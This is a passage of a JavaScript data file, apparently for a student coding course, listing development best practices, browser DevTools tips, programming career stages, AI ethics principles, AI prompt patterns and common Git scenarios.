      whatItMeans: 'Automatically format code for consistency.',
      examples: [
        'Install Prettier',
        'Configure via .prettierrc',
        'Run on save in editor',
        'Run in CI to enforce',
      ],
      whyMatters: 'Inconsistent formatting is a maintenance burden. Auto-format = no debates.',
      antiExample: '// Mixed styles in different files\nfunction foo() {return 1}\n\nfunction bar()\n{\n  return 2;\n}',
      goodExample: '// All formatted consistently by Prettier\nfunction foo() {\n  return 1;\n}\n\nfunction bar() {\n  return 2;\n}',
      learnMore: 'prettier.io',
    },
    {
      practice: 'Use a linter (ESLint)',
      whatItMeans: 'Static analysis to catch bugs + enforce style.',
      examples: [
        'ESLint for JavaScript',
        'Configure with team-agreed rules',
        'Run in editor (red squiggles)',
        'Run in CI',
      ],
      whyMatters: 'Catches bugs before runtime. Enforces best practices. Consistency.',
      antiExample: '// No linting:\nlet x = 5;\nlet x = 10; // Re-declared\nconsole.log(y); // Undefined',
      goodExample: '// ESLint catches both errors before running',
      learnMore: 'eslint.org',
    },
    {
      practice: 'Use TypeScript (or JSDoc)',
      whatItMeans: 'Add static type checking to JavaScript.',
      examples: [
        'TypeScript: full type system',
        'JSDoc: lighter, comment-based types',
        'Catches type errors at compile time',
        'Better IDE autocomplete',
      ],
      whyMatters: 'Types catch many bugs. Self-documenting code. Better refactoring.',
      antiExample: 'function calc(x) { return x.amount * x.rate; }\n// Called with calc({}) — runtime error',
      goodExample: 'function calc(x: { amount: number; rate: number }): number {\n  return x.amount * x.rate;\n}\n// calc({}) — TypeScript error before run',
      learnMore: 'typescriptlang.org',
    },
    {
      practice: 'Write meaningful commit messages',
      whatItMeans: 'Commits should explain WHY, not just what.',
      examples: [
        '50-char summary line',
        'Blank line',
        'Detailed description (why)',
        'Reference issue numbers',
      ],
      whyMatters: '6 months later, you need to know WHY you did something. Future you (or others) will thank you.',
      antiExample: 'Commit: "fix bug"\nCommit: "update"\nCommit: "wip"',
      goodExample: 'Commit: "Fix XSS vulnerability in comment rendering\n\nThe comment field was using innerHTML, which allowed users to inject\nHTML + scripts. Changed to textContent. Tests added for malicious input.\n\nFixes #1234"',
      learnMore: 'cbea.ms/git-commit/',
    },
    {
      practice: 'Document your APIs',
      whatItMeans: 'Every public function/component should have documentation.',
      examples: [
        'JSDoc comments',
        'README files',
        'API docs (Swagger, etc.)',
        'Example usage',
      ],
      whyMatters: 'Future you + other devs need to know how to use your code.',
      antiExample: '/* No doc */\nfunction processData(d) { /* ... */ }',
      goodExample: '/**\n * Processes data into a normalized form for storage.\n * @param {Object} data - The raw input data\n * @param {string} data.email - User\'s email\n * @param {number} data.age - User\'s age (0-150)\n * @returns {Object} The normalized data + timestamp\n * @throws {Error} If email is invalid\n */\nfunction processData(data) { /* ... */ }',
      learnMore: 'jsdoc.app',
    },
    {
      practice: 'Use a CSS reset / normalize',
      whatItMeans: 'Standardize default styles across browsers.',
      examples: [
        'Reset: removes all default styles',
        'Normalize: makes them consistent across browsers',
        'Modern: own opinionated reset',
      ],
      whyMatters: 'Browsers have different defaults. Consistent baseline = predictable styles.',
      antiExample: '<!-- Default browser styles bleed through, inconsistent -->\n<h1>Title</h1>\n<p>Text</p>',
      goodExample: '<style>\n  *, *::before, *::after { box-sizing: border-box; }\n  body { margin: 0; padding: 0; }\n  h1 { font-size: clamp(1.5rem, 4vw, 3rem); }\n  /* Etc. */\n</style>',
      learnMore: 'piccalil.li/blog/a-modern-css-reset/',
    },
    {
      practice: 'Use semantic versioning',
      whatItMeans: 'Version your software with MAJOR.MINOR.PATCH format.',
      examples: [
        'MAJOR: breaking changes (1.0.0 → 2.0.0)',
        'MINOR: new features (1.0.0 → 1.1.0)',
        'PATCH: bug fixes (1.0.0 → 1.0.1)',
        'Pre-release: 1.0.0-beta.1',
      ],
      whyMatters: 'Predictable. Tells users what to expect from upgrades.',
      antiExample: 'v1, v2, v3 (no scheme)\n\nor "Version 1.0 final" (still updating)',
      goodExample: '1.0.0 → 1.0.1 (bugfix)\n1.0.1 → 1.1.0 (new feature, backward compatible)\n1.1.0 → 2.0.0 (breaking change)',
      learnMore: 'semver.org',
    },
    {
      practice: 'Use a linter\'s "fix" feature',
      whatItMeans: 'Run linter + formatter automatically.',
      examples: [
        '`npm run lint -- --fix`',
        '`npm run format`',
        'Editor on-save plugins',
        'Pre-commit hooks (husky)',
        'CI on every push',
      ],
      whyMatters: 'Manual style fixing is tedious. Auto-fix is fast + consistent.',
      antiExample: '// Manual style fixes for hours',
      goodExample: '// Save file → auto-formatted\n// Pre-commit → linter runs automatically\n// CI → enforces clean code',
      learnMore: 'husky.dev',
    },
    {
      practice: 'Use Continuous Integration (CI)',
      whatItMeans: 'Every commit/PR runs tests + checks automatically.',
      examples: [
        'GitHub Actions (free for public repos)',
        'GitLab CI',
        'CircleCI',
        'Run tests, linter, type check',
        'Catch issues before merge',
      ],
      whyMatters: 'Bugs that don\'t reach main are bugs users don\'t see.',
      antiExample: '// Devs run tests "when they remember"',
      goodExample: '// .github/workflows/ci.yml runs on every PR\n// - npm install\n// - npm run lint\n// - npm test\n// - npm run build',
      learnMore: 'docs.github.com/en/actions',
    },
    {
      practice: 'Use environments (dev, staging, prod)',
      whatItMeans: 'Different deployments for different purposes.',
      examples: [
        'Dev: local development',
        'Staging: full deployment for testing',
        'Production: real users',
        'Different env vars per environment',
        'Different feature flags per environment',
      ],
      whyMatters: 'Test in production-like environment before users see it.',
      antiExample: '// Test in production. What could go wrong?',
      goodExample: '// Three environments\n// Promote: dev → staging → production\n// Roll back if production has issues',
      learnMore: '12 Factor App Methodology',
    },
    {
      practice: 'Use feature flags',
      whatItMeans: 'Code can be deployed without being active.',
      examples: [
        'Boolean flags in config',
        'Gradual rollouts',
        'A/B testing',
        'Quick disable in emergencies',
      ],
      whyMatters: 'Deploy code without exposing it. Test in production safely. Quick rollback.',
      antiExample: '// New feature deployed → all users see it → has bug → revert + redeploy',
      goodExample: 'if (featureFlag("newFeature")) {\n  // New feature code\n} else {\n  // Old code (backup)\n}',
      learnMore: 'launchdarkly.com',
    },
    {
      practice: 'Monitor production',
      whatItMeans: 'Watch for errors, performance issues, user behavior.',
      examples: [
        'Error tracking: Sentry, Rollbar',
        'Performance: New Relic, Datadog',
        'User analytics: Google Analytics, Mixpanel',
        'Set up alerts for issues',
      ],
      whyMatters: 'Real users hit real problems. You need to know about them.',
      antiExample: '// Hope nothing breaks. Users tell you when they\'re mad.',
      goodExample: '// Sentry catches every error\n// Alerts when error rate spikes\n// Dashboard shows real-time metrics',
      learnMore: 'sentry.io',
    },
    {
      practice: 'Write a README',
      whatItMeans: 'Every project should have a README explaining what + how.',
      examples: [
        'Project name + description',
        'How to install',
        'How to run',
        'How to contribute',
        'License',
        'Screenshots/demos',
      ],
      whyMatters: 'New contributors (or future you) need to onboard quickly.',
      antiExample: 'README.md: "(empty)" or "TODO"',
      goodExample: '# Project Name\n\nDescription of what this does.\n\n## Installation\n\n```bash\nnpm install\n```\n\n## Usage\n\n```bash\nnpm start\n```\n\n## Tests\n\n```bash\nnpm test\n```\n\n## License\n\nMIT',
      learnMore: 'makeareadme.com',
    },
  ];

  // ─── Browser DevTools detailed walkthrough ────────────────────────
  var DEVTOOLS_GUIDE = [
    {
      panel: 'Elements / Inspector',
      whatItDoes: 'Inspect + edit HTML + CSS in real time.',
      keyFeatures: [
        'Right-click any element + "Inspect" to jump to it in DevTools',
        'Edit HTML directly — Enter to apply',
        'See computed styles + which rules apply',
        'Edit CSS in real time, see effect immediately',
        'View accessibility tree',
        'Use ":hov" or ":focus" pseudo-state forcing for testing',
      ],
      tipsForStudents: [
        'Use Cmd/Ctrl + Shift + C to launch inspector + pick an element',
        'Try editing a real website — your changes are local only',
        'View "Accessibility" tab to see what screen readers will hear',
        'Use the "Layout" tab to visualize flexbox + grid',
      ],
      proTip: 'Test CSS changes here BEFORE writing them in your code.',
      shortcutKeys: 'Cmd/Ctrl + Shift + I (open DevTools), Cmd/Ctrl + Shift + C (inspector)',
    },
    {
      panel: 'Console',
      whatItDoes: 'Run JavaScript. View logs. Debug errors.',
      keyFeatures: [
        'Run any JavaScript code',
        'console.log(), .error(), .warn() output here',
        'Errors with stack traces',
        'Special variables: $0 (last selected element), $_ (last result)',
        'Use $() and $$() as shortcuts for querySelector/All',
      ],
      tipsForStudents: [
        'console.log(myVar) is your debugging friend',
        'console.table(arr) makes arrays/objects readable',
        'console.dir(obj) shows object properties',
        'console.time("label") + console.timeEnd("label") for timing',
        'Right-click error → "Show full stack" for diagnostics',
      ],
      proTip: 'Use templates: console.log("x:", x) for clarity.',
      shortcutKeys: 'Cmd/Ctrl + ` (cycle DevTools tabs in some browsers)',
    },
    {
      panel: 'Network',
      whatItDoes: 'Watch HTTP requests + responses.',
      keyFeatures: [
        'See every request made by page',
        'Filter by type (XHR, JS, CSS, Img)',
        'Throttle network speed (simulate slow connection)',
        'Disable cache',
        'See request/response headers + bodies',
        'See timing breakdown (DNS, connect, wait, content)',
        'Export as HAR file',
      ],
      tipsForStudents: [
        'Use throttling to test on simulated 3G',
        'Look for slow requests (yellow bars)',
        'Verify your fetch() is sending the right data',
        'See if API returned what you expected',
        'Look for 4xx + 5xx errors',
      ],
      proTip: 'Network shows what\'s really happening — better than guessing.',
      shortcutKeys: 'Cmd/Ctrl + Shift + I, then click Network',
    },
    {
      panel: 'Sources / Debugger',
      whatItDoes: 'Set breakpoints. Step through code. Inspect variables.',
      keyFeatures: [
        'Browse all loaded JS files',
        'Set breakpoints by clicking line number',
        'Step over, step into, step out',
        'See call stack',
        'See watch variables',
        'Pause on exception',
        'Conditional breakpoints',
      ],
      tipsForStudents: [
        'Stop using console.log everywhere — use breakpoints',
        'Click line number to set breakpoint. Re-run code.',
        'Pause on uncaught exceptions to debug',
        'Use "debugger;" in code to trigger pause when DevTools open',
        'Watch variables to track value changes',
      ],
      proTip: 'Breakpoints are 10x more powerful than console.log. Learn them.',
      shortcutKeys: 'F8 (continue), F10 (step over), F11 (step into)',
    },
    {
      panel: 'Performance',
      whatItDoes: 'Profile JavaScript + rendering performance.',
      keyFeatures: [
        'Record a session of interactions',
        'See exactly what runs + when',
        'Identify slow functions',
        'See rendering, layout, paint timings',
        'See memory usage over time',
      ],
      tipsForStudents: [
        'Record a session. Look for "long tasks" (yellow/red bars).',
        'Find functions that take >50ms',
        'Identify layout thrashing (alternating purple + green bars)',
        'Use to verify performance optimizations actually help',
      ],
      proTip: 'Don\'t optimize without profiling first.',
      shortcutKeys: 'Cmd/Ctrl + E (start/stop recording when on this tab)',
    },
    {
      panel: 'Application',
      whatItDoes: 'Inspect storage (cookies, localStorage, IndexedDB).',
      keyFeatures: [
        'View + edit cookies',
        'View + edit localStorage + sessionStorage',
        'Inspect IndexedDB databases',
        'View service workers',
        'View cache contents',
        'Clear storage for testing',
      ],
      tipsForStudents: [
        'Debug localStorage by viewing it directly',
        'Clear cache when testing changes',
        'See if your service worker registered',
        'Check what data you\'re storing (privacy review)',
      ],
      proTip: 'Use "Clear storage" before testing — start fresh.',
      shortcutKeys: 'N/A',
    },
    {
      panel: 'Lighthouse',
      whatItDoes: 'Audit performance, accessibility, SEO, best practices.',
      keyFeatures: [
        'Performance score 0-100',
        'Accessibility score 0-100',
        'SEO score 0-100',
        'Best practices score 0-100',
        'PWA score',
        'Detailed reports with specific issues',
        'Suggested fixes',
      ],
      tipsForStudents: [
        'Run on every project before deployment',
        'Target 100 in accessibility',
        'Address performance issues found',
        'Use opportunities + diagnostics sections',
        'Compare reports before + after changes',
      ],
      proTip: 'Lighthouse runs locally — privacy-safe. Run it in CI for every deployment.',
      shortcutKeys: 'N/A',
    },
    {
      panel: 'Memory',
      whatItDoes: 'Find memory leaks. Analyze heap.',
      keyFeatures: [
        'Take heap snapshots',
        'Compare snapshots (find leaked objects)',
        'See retained vs shallow size',
        'Identify detached DOM nodes',
        'Allocation profiler',
      ],
      tipsForStudents: [
        'If your app gets slow over time, may be memory leak',
        'Take snapshot, do action, take snapshot, compare',
        'Look for "Detached DOM" — elements removed from page but still in memory',
        'Profile only when you suspect issue',
      ],
      proTip: 'Memory leaks are hard. Profile is essential.',
      shortcutKeys: 'N/A',
    },
    {
      panel: 'Security',
      whatItDoes: 'Inspect SSL/TLS, certificates, mixed content.',
      keyFeatures: [
        'Verify HTTPS configuration',
        'See certificate details',
        'Identify mixed content (HTTPS page loading HTTP resources)',
        'View security policies (CSP, etc.)',
      ],
      tipsForStudents: [
        'Verify your site uses HTTPS',
        'Find mixed content warnings',
        'Test certificate validity',
      ],
      proTip: 'Security panel is for verification. Implementation is in your code.',
      shortcutKeys: 'N/A',
    },
    {
      panel: 'Coverage',
      whatItDoes: 'Show unused CSS + JS.',
      keyFeatures: [
        'Records which CSS + JS is actually used',
        'Visualize unused vs used',
        'Identify dead code',
      ],
      tipsForStudents: [
        'Find CSS rules never applied',
        'Find JS functions never called',
        'Remove dead code to reduce bundle size',
      ],
      proTip: 'Combined with bundle analysis tools.',
      shortcutKeys: 'N/A',
    },
    {
      panel: 'Sensors / Device Mode',
      whatItDoes: 'Simulate mobile devices, GPS, orientation.',
      keyFeatures: [
        'Test responsive design on various devices',
        'Set device pixel ratio',
        'Simulate GPS coordinates',
        'Simulate device orientation',
        'Simulate slow CPU + slow network',
      ],
      tipsForStudents: [
        'Test on multiple device sizes',
        'Use device frame to see real layout',
        'Test on simulated slow devices',
      ],
      proTip: 'Real devices are still best. But Device Mode is good for iteration.',
      shortcutKeys: 'Cmd/Ctrl + Shift + M (toggle device mode)',
    },
  ];

  // ─── Career development for student programmers ──────────────────
  var CAREER_DEVELOPMENT = [
    {
      stage: 'Middle school (6-8)',
      focus: 'Exploration + curiosity',
      goalActivities: [
        'Build many small projects to discover what you like',
        'Try different languages (JS, Python, Scratch)',
        'Solve programming puzzles (CodeCombat, CodingGame)',
        'Read books about programmers (Coding Mom, Ada\'s Algorithm)',
        'Watch developers code on YouTube (livecoding streams)',
        'Try a coding camp or weekend workshop',
      ],
      whatToAvoid: [
        'Don\'t pressure yourself to "specialize" early',
        'Don\'t skip foundations to chase fancy tools',
      ],
      timeline: 'No fixed goals. Just explore.',
      success: 'You enjoy coding + want to keep doing it.',
    },
    {
      stage: 'High school (9-12)',
      focus: 'Build skills + portfolio',
      goalActivities: [
        'Take AP CSP and/or AP CS A if available',
        'Build 5-10 portfolio projects on GitHub',
        'Contribute to one open-source project',
        'Try a programming competition (USACO, ACSL)',
        'Get an internship or volunteer to build something for a local nonprofit',
        'Take advanced math (helps with algorithms)',
        'Read "Cracking the Coding Interview"',
        'Apply to coding scholarships',
      ],
      whatToAvoid: [
        'Don\'t do "interview prep" without learning fundamentals',
        'Don\'t copy projects without modification',
        'Don\'t pretend to know languages you don\'t',
      ],
      timeline: 'By senior year: confident with one language, portfolio of projects, AP CSP score.',
      success: 'Apply to college with strong CS application or get a real coding job.',
    },
    {
      stage: 'College',
      focus: 'Deep knowledge + connections',
      goalActivities: [
        'Major in CS (or related: math, engineering, statistics)',
        'Take ALL the algorithm + data structure courses',
        'Take a systems course (operating systems)',
        'Take theory (discrete math, automata)',
        'Get summer internships every year',
        'Contribute to research labs or open source',
        'Build deeper projects (3-6 month timelines)',
        'Get to know your professors',
        'Network with alumni',
      ],
      whatToAvoid: [
        'Don\'t skip theory thinking it\'s irrelevant',
        'Don\'t over-specialize too early',
        'Don\'t neglect non-CS courses (writing matters)',
      ],
      timeline: 'Internships after sophomore + junior years. Full-time offer senior year.',
      success: 'Graduate with offer in hand. Or grad school for research.',
    },
    {
      stage: 'Bootcamp path (alternative to college)',
      focus: 'Job-ready in 6-12 months',
      goalActivities: [
        'Choose a respected bootcamp (Hack Reactor, App Academy, etc.)',
        'Have realistic expectations — 6 months of intense study',
        'Build a substantial capstone project',
        'Network during + after bootcamp',
        'Apply to junior dev positions',
        'Be patient — first job may take 6+ months',
      ],
      whatToAvoid: [
        'Don\'t pay for overpriced bootcamp without checking outcomes',
        'Don\'t assume bootcamp = guaranteed job',
        'Don\'t neglect interview practice',
      ],
      timeline: '6-12 months bootcamp. Then 3-6 months job hunt.',
      success: 'Junior developer position.',
    },
    {
      stage: 'Self-taught path',
      focus: 'Disciplined self-learning',
      goalActivities: [
        'Use free resources (freeCodeCamp, MDN, The Odin Project)',
        'Build a structured curriculum',
        'Build many projects (10+)',
        'Find an accountability partner',
        'Join programming communities (Discord, Reddit)',
        'Apply for jobs when you have a strong portfolio',
        'Network — meetups, conferences (when possible)',
      ],
      whatToAvoid: [
        'Don\'t get stuck in tutorial hell',
        'Don\'t avoid asking for help',
        'Don\'t neglect computer science fundamentals',
      ],
      timeline: '12-24 months for first job.',
      success: 'Junior developer position OR successful freelancer.',
    },
    {
      stage: 'First job',
      focus: 'Learn fast + add value',
      goalActivities: [
        'Listen + observe before contributing big changes',
        'Read existing code',
        'Ask thoughtful questions',
        'Pair program with senior engineers',
        'Read all the documentation',
        'Contribute small but visible improvements',
        'Find a mentor',
      ],
      whatToAvoid: [
        'Don\'t pretend to know things you don\'t',
        'Don\'t suggest big rewrites in first month',
        'Don\'t neglect culture + collaboration',
      ],
      timeline: 'First 90 days: learn the codebase. First year: become productive contributor.',
      success: 'Promoted from "junior" expectations or get strong performance review.',
    },
    {
      stage: 'Mid-career (3-5 years)',
      focus: 'Specialize + lead',
      goalActivities: [
        'Choose a specialty (frontend, backend, ML, security)',
        'Lead a project end-to-end',
        'Mentor juniors',
        'Speak at meetups',
        'Write technical blog posts',
        'Maintain or create open-source project',
        'Consider grad school for research',
      ],
      whatToAvoid: [
        'Don\'t stay in your comfort zone',
        'Don\'t neglect networking',
        'Don\'t coast — keep learning',
      ],
      timeline: '3-7 years to "senior engineer."',
      success: 'Senior or staff engineer. Lead engineer for a team.',
    },
    {
      stage: 'Senior (5-10 years)',
      focus: 'Architecture + influence',
      goalActivities: [
        'Design systems that handle real scale',
        'Mentor multiple juniors',
        'Influence team or org direction',
        'Speak at conferences',
        'Maintain visible open-source presence',
        'Consider moving to management or staying technical',
      ],
      whatToAvoid: [
        'Don\'t stop coding (if you want to stay technical)',
        'Don\'t become an expert in only one stack',
      ],
      timeline: '10-20 years for "staff" or "principal" engineer.',
      success: 'Recognized expert in your domain. Highly paid. Choose your path.',
    },
  ];

  // ─── AI ethics + prompt engineering for student app builders ─────
  var AI_ETHICS = [
    {
      principle: 'Disclose AI use',
      definition: 'When you use AI to help create work, disclose that you used it.',
      whyMatters: 'Academic integrity. Honest attribution. Transparency about AI-augmented work.',
      example: 'In academic submissions: "I used GitHub Copilot to generate the initial scaffolding for the React component. I then modified the logic for the form validation manually."',
      goodPractice: 'Tell teachers + supervisors when AI was significantly involved.',
      badPractice: 'Submit AI-generated code as your own creation without acknowledging.',
      classroomApplication: 'Class policy on AI use. Discuss what level of AI assistance is acceptable. Train students in proper attribution.',
    },
    {
      principle: 'Verify AI output',
      definition: 'AI can confidently produce wrong information. Always verify.',
      whyMatters: 'AI "hallucinations" — confident but false statements — are common.',
      example: 'AI suggests using a JavaScript function that doesn\'t exist (e.g., Array.prototype.unique()). Check MDN before using.',
      goodPractice: 'Test all AI-generated code. Read documentation for any API the AI claims exists.',
      badPractice: 'Trust AI output without checking, then deploy it to production.',
      classroomApplication: 'Teach students to fact-check AI claims. Include verification as part of any AI-assisted assignment.',
    },
    {
      principle: 'Don\'t share sensitive data with AI',
      definition: 'When using AI tools, don\'t paste secrets, personal data, or proprietary code.',
      whyMatters: 'AI services may log + train on your inputs. Some leak.',
      example: 'Bad: paste your company\'s database schema + API keys into ChatGPT. Good: ask abstract questions without the secrets.',
      goodPractice: 'Anonymize before sharing. Use local/on-device AI for sensitive work.',
      badPractice: 'Paste customer data, passwords, or proprietary code into public AI tools.',
      classroomApplication: 'Teach data privacy. Discuss what shouldn\'t be shared with AI services.',
    },
    {
      principle: 'Understand AI limitations',
      definition: 'AI excels at some tasks + fails at others. Know which.',
      whyMatters: 'Misusing AI wastes time. Trusting it for hard tasks fails.',
      example: 'AI good for: boilerplate code, common patterns, refactoring suggestions, learning syntax. AI bad for: novel algorithms, security audits, complex business logic, debugging unique issues.',
      goodPractice: 'Use AI for amplification, not substitution. Bring your own thinking.',
      badPractice: 'Try to have AI do entirely novel work it has no training for.',
      classroomApplication: 'Demonstrate AI failures. Practice writing prompts that get good results.',
    },
    {
      principle: 'Don\'t replace human judgment',
      definition: 'AI is a tool. Human judgment is essential for what to build + how.',
      whyMatters: 'AI doesn\'t know what\'s ethical, what\'s safe, what users actually need.',
      example: 'AI can write a "facial recognition app" but humans must decide: should we build this? For what purpose? With what oversight?',
      goodPractice: 'Always evaluate AI suggestions against your judgment + ethics.',
      badPractice: 'Defer to AI without thinking about implications.',
      classroomApplication: 'Discuss "just because we can build X with AI" — should we?',
    },
    {
      principle: 'Cite + attribute training data',
      definition: 'AI models are trained on data created by others. Acknowledge this.',
      whyMatters: 'Many people contributed to AI capabilities. Their contributions are often unacknowledged.',
      example: 'GitHub Copilot was trained on GitHub public code. Open-source authors may not have consented to this use.',
      goodPractice: 'Support open-source maintainers + content creators whose work feeds AI.',
      badPractice: 'Use AI without thinking about the labor that made it possible.',
      classroomApplication: 'Discuss training data ethics + AI compensation models.',
    },
    {
      principle: 'Avoid bias amplification',
      definition: 'AI models reflect biases in their training data. Don\'t amplify those biases.',
      whyMatters: 'Code generated by AI may reflect systemic biases (e.g., favoring certain demographics).',
      example: 'AI might generate code that assumes binary gender. Or default usernames in test data that reflect Western patterns.',
      goodPractice: 'Review AI output for bias. Test with diverse inputs.',
      badPractice: 'Accept AI output without checking for bias.',
      classroomApplication: 'Demonstrate AI bias examples. Discuss responsible AI design.',
    },
    {
      principle: 'Respect intellectual property',
      definition: 'AI may generate output similar to copyrighted code.',
      whyMatters: 'Legal + ethical implications of using "borrowed" code.',
      example: 'AI generates code very similar to a specific open-source library. Using that as your own may violate the library\'s license.',
      goodPractice: 'Check AI output for similarity to known sources. Use proper attribution.',
      badPractice: 'Treat AI output as fully original work.',
      classroomApplication: 'Discuss IP + AI legal landscape. Show real examples.',
    },
    {
      principle: 'Don\'t use AI for malicious purposes',
      definition: 'AI tools can be misused. Be intentional about what you build.',
      whyMatters: 'AI-generated content (fake reviews, spam, phishing) hurts trust + people.',
      example: 'Don\'t use AI to generate fake reviews. Don\'t use AI to impersonate someone. Don\'t use AI to generate spam.',
      goodPractice: 'Use AI for constructive purposes. Refuse + report misuse.',
      badPractice: 'Use AI to create deceptive content.',
      classroomApplication: 'Discuss AI misuse. Build culture of responsible use.',
    },
    {
      principle: 'Stay informed about AI capabilities',
      definition: 'AI changes rapidly. Skills that are valuable today change tomorrow.',
      whyMatters: 'What students learn now will be different in 2 years.',
      example: 'In 2020 GitHub Copilot didn\'t exist. By 2024 most professional devs use it daily. By 2030 the landscape will be different again.',
      goodPractice: 'Build adaptability. Focus on fundamentals.',
      badPractice: 'Only learn specific tool — neglect foundations.',
      classroomApplication: 'Emphasize CS fundamentals + computational thinking over specific tools.',
    },
  ];

  // ─── Effective AI prompt patterns ──────────────────────────────
  var PROMPT_PATTERNS = [
    {
      pattern: 'Zero-shot prompt',
      definition: 'Ask AI to do something without examples.',
      whenUse: 'Simple, well-known tasks.',
      example: '"Write a function that sums all numbers in an array."',
      whyWorks: 'AI knows common patterns from training. No examples needed.',
      whyFails: 'For uncommon or domain-specific tasks.',
      improvement: 'For better results, add few-shot examples.',
    },
    {
      pattern: 'Few-shot prompt',
      definition: 'Provide 2-3 examples before asking AI to apply pattern.',
      whenUse: 'When pattern is unique to your context.',
      example: '"Convert these to camelCase:\\n- hello world → helloWorld\\n- my function name → myFunctionName\\n- now this → ?"',
      whyWorks: 'Examples teach AI your specific pattern.',
      whyFails: 'If examples are inconsistent.',
      improvement: 'Use 3-5 consistent examples for best results.',
    },
    {
      pattern: 'Chain-of-thought',
      definition: 'Ask AI to think through the problem step-by-step.',
      whenUse: 'Complex reasoning, multi-step problems.',
      example: '"Solve this step by step: A train leaves station A at 60mph, another from station B (200 miles away) at 40mph. When do they meet?\\n\\nLet me think step by step:"',
      whyWorks: 'Explicit reasoning leads to better answers.',
      whyFails: 'For simple tasks (slower).',
      improvement: 'Combine with examples.',
    },
    {
      pattern: 'Role prompt',
      definition: 'Tell AI to act as a specific role/persona.',
      whenUse: 'When you need specific perspective or expertise.',
      example: '"You are a senior code reviewer. Review this code for security issues + suggest improvements."',
      whyWorks: 'Activates relevant training data + style.',
      whyFails: 'Can produce overconfident output.',
      improvement: 'Combine with specific criteria.',
    },
    {
      pattern: 'Output format specification',
      definition: 'Tell AI exactly what format you want.',
      whenUse: 'When you need structured output (JSON, table, list).',
      example: '"Return your response as JSON with keys: title, description, tags. No prose, just JSON."',
      whyWorks: 'AI follows clear instructions.',
      whyFails: 'For ambiguous tasks.',
      improvement: 'Provide example output.',
    },
    {
      pattern: 'Constraints + criteria',
      definition: 'Specify constraints + success criteria explicitly.',
      whenUse: 'For code generation.',
      example: '"Generate a function that:\\n- Takes an array of numbers\\n- Returns the median\\n- Handles empty array (return null)\\n- Handles single element\\n- Handles even + odd length\\n- Uses no external libraries"',
      whyWorks: 'Specific requirements get specific results.',
      whyFails: 'When constraints conflict.',
      improvement: 'Test with various inputs.',
    },
    {
      pattern: 'Iterative refinement',
      definition: 'Generate output, evaluate, refine prompt, regenerate.',
      whenUse: 'Most real tasks.',
      example: '1. "Build a todo app." → too vague, generic result\n2. "Build a todo app with: localStorage persistence, dark mode, drag-and-drop reordering, mobile-responsive." → better\n3. After review: "Make the drag-and-drop work on touch devices too." → refined',
      whyWorks: 'Iteration finds the right level of specificity.',
      whyFails: 'When you give up too early.',
      improvement: 'Always iterate, don\'t expect first output to be perfect.',
    },
    {
      pattern: 'Test-driven prompt',
      definition: 'Specify test cases, ask AI to implement.',
      whenUse: 'When you can describe behavior but not implementation.',
      example: '"Write a function isLeapYear that:\\n- isLeapYear(2000) → true\\n- isLeapYear(2024) → true\\n- isLeapYear(2100) → false\\n- isLeapYear(2025) → false"',
      whyWorks: 'Tests communicate requirements unambiguously.',
      whyFails: 'For non-deterministic tasks.',
      improvement: 'Cover edge cases in your tests.',
    },
    {
      pattern: 'Critique + revise',
      definition: 'AI produces output. You critique. AI revises.',
      whenUse: 'For multi-round refinement.',
      example: '"That works but the function is hard to read. Refactor for clarity, with explanatory comments."',
      whyWorks: 'Each round can improve different aspects.',
      whyFails: 'After 3-4 rounds, output may degrade.',
      improvement: 'Save the best version + start over if needed.',
    },
    {
      pattern: 'Generate + verify pattern',
      definition: 'Use AI to generate something. Then use AI (or human) to verify it.',
      whenUse: 'For factual or technical claims.',
      example: '1. AI: "Write a regex to validate email addresses."\\n2. AI: "Show me 10 valid emails and 10 invalid emails. Does the regex correctly classify each?"',
      whyWorks: 'Verification step catches AI errors.',
      whyFails: 'If verification logic is also wrong.',
      improvement: 'Test with real data, not just AI-generated examples.',
    },
  ];

  // ─── Comprehensive Git scenarios + commands ───────────────────────
  var GIT_SCENARIOS = [
    {
      scenario: 'You\'re starting a new project',
      step1: 'Initialize: $ git init',
      step2: 'Create files (README, .gitignore, source code)',
      step3: 'Stage: $ git add .',
      step4: 'Commit: $ git commit -m "Initial commit"',
      step5: 'Create GitHub repo (without README)',
      step6: 'Connect: $ git remote add origin https://github.com/user/repo.git',
      step7: 'Push: $ git push -u origin main',
      tips: 'Add .gitignore BEFORE first commit to avoid tracking node_modules etc.',
    },
    {
      scenario: 'You want to clone an existing repo',
      step1: 'Find the URL on GitHub',
      step2: 'Clone: $ git clone https://github.com/user/repo.git',
      step3: 'Enter directory: $ cd repo',
      step4: 'Install deps if needed: $ npm install',
      step5: 'Make changes',
      step6: 'Stage + commit + push as usual',
      tips: 'You\'ll be on main branch by default. Create a new branch for changes.',
    },
    {
      scenario: 'You\'re starting a new feature',
      step1: 'Get latest: $ git checkout main; git pull',
      step2: 'Create branch: $ git checkout -b feature/my-feature',
      step3: 'Make changes',
      step4: 'Stage + commit: $ git add file.js; git commit -m "Add X"',
      step5: 'Push: $ git push -u origin feature/my-feature',
      step6: 'Open Pull Request on GitHub',
      tips: 'Use descriptive branch names: feature/x, fix/y, refactor/z',
    },
    {
      scenario: 'You messed up your last commit message',
      step1: 'Don\'t panic',
      step2: 'Amend: $ git commit --amend -m "Better message"',
      step3: 'If already pushed: $ git push --force-with-lease',
      tips: '--force-with-lease is safer than --force (catches if others pushed too)',
      whenNot: 'Never amend a commit others have already pulled.',
    },
    {
      scenario: 'You committed wrong files',
      step1: 'Don\'t panic',
      step2: 'Undo last commit but keep changes: $ git reset --soft HEAD~1',
      step3: 'Unstage if needed: $ git reset HEAD file.js',
      step4: 'Edit files as needed',
      step5: 'Re-stage + commit correctly',
      tips: 'git reset --soft keeps changes. git reset --hard DESTROYS changes.',
      whenNot: 'Never reset commits that are already pushed.',
    },
    {
      scenario: 'You need to undo a commit that\'s already pushed',
      step1: 'Use revert (creates new commit that undoes): $ git revert HEAD',
      step2: 'Push: $ git push',
      tips: 'Revert is SAFE because it adds a new commit. History is preserved.',
      whenNot: 'Don\'t use git reset on pushed commits.',
    },
    {
      scenario: 'Merge conflict during pull',
      step1: 'Don\'t panic',
      step2: 'See conflicted files: $ git status',
      step3: 'Open file. Find <<<<<<< markers.',
      step4: 'Edit to keep the version you want (or both).',
      step5: 'Remove conflict markers (<<<<, ====, >>>>)',
      step6: 'Stage + commit: $ git add file.js; git commit',
      tips: 'Use a merge tool (VS Code has one). Communicate with team about conflicts.',
    },
    {
      scenario: 'You want to see what changed',
      step1: 'See unstaged changes: $ git diff',
      step2: 'See staged changes: $ git diff --staged',
      step3: 'See history: $ git log --oneline',
      step4: 'See changes in a commit: $ git show <hash>',
      tips: 'Use git log --graph for visualization of branches.',
    },
    {
      scenario: 'You want to throw away local changes',
